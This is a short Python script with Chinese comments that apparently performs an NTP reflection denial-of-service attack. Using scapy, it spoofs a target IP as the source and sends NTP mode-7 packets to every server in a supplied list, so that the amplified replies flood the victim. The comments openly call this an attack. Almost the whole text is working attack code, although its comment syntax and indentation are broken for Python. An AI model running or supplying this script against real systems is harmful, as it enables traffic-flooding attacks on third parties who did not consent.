//代码由python编写，需要安装python环境以及scapy包

//使用方法为python ntp-test.py dst-ip ntp-server-file.txt，dst-ip为攻//击的目标IP地址，ntp-server-file.txt为ntp server服务器列表

#!/usr/bin/env python

import sys

from scapy.all import *

//NTP攻击包发包函数

def attack(target, ntp_server):

send(IP(dst=ntp_server, src=target)/(UDP(sport=52816)/NTP(version=2, mode=7, stratum=0, poll=3, precision=42)))

if __name__ == "__main__":

if len(sys.argv) != 3:

sys.exit(1)

target = sys.argv[1]

ntp_server_file = sys.argv[2]

for ntp_server in open(ntp_server_file, "r"): //读取NTP Server列表

ntp_server = ntp_server.strip()

if ntp_server != "":

attack(target, ntp_server)   //开始攻击